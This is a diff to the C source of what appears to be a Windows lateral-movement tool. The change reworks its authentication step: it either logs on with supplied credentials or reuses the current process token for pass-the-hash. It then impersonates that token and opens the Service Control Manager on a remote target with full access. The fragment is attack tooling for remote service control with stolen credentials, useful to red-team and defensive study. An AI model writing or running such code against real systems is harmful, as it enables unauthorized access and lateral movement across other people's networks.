@@ -28,29 +28,27 @@ int main(int argc, char **argv) {
         printf("Trying to connect to %s\n", targetHost);
     }
 
+    HANDLE hToken = NULL;
     if(username != NULL) {
-        HANDLE hToken = NULL;
-        if(strcmp(username, "pth") == 0) {
-            printf("Using Pass-The-Hash for authentication\n");
-            if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
-                printf("OpenProcessToken failed %ld\n", GetLastError());
-                ExitProcess(0);
-            }
-        } else {
-            printf("Username was provided attempting to call LogonUserA\n");
-            bResult = LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken);
-            if(!bResult) {
-                printf("LogonUserA failed %ld\n", GetLastError());
-                ExitProcess(0);
-            }
-        }
-
-        bResult = FALSE;
-        bResult = ImpersonateLoggedOnUser(hToken);
+        printf("Username was provided attempting to call LogonUserA\n");
+        bResult = LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken);
         if(!bResult) {
-            printf("ImpersonateLoggedOnUser failed %ld\n", GetLastError());
+            printf("LogonUserA failed %ld\n", GetLastError());
             ExitProcess(0);
         }
+    } else {
+        printf("Using current process context for authentication. (Pass the hash)\n");
+        if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
+            printf("OpenProcessToken failed %ld\n", GetLastError());
+            ExitProcess(0);
+        }
+    }
+
+    bResult = FALSE;
+    bResult = ImpersonateLoggedOnUser(hToken);
+    if(!bResult) {
+        printf("ImpersonateLoggedOnUser failed %ld\n", GetLastError());
+        ExitProcess(0);
     }
 
     SC_HANDLE schManager = OpenSCManagerA(targetHost, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
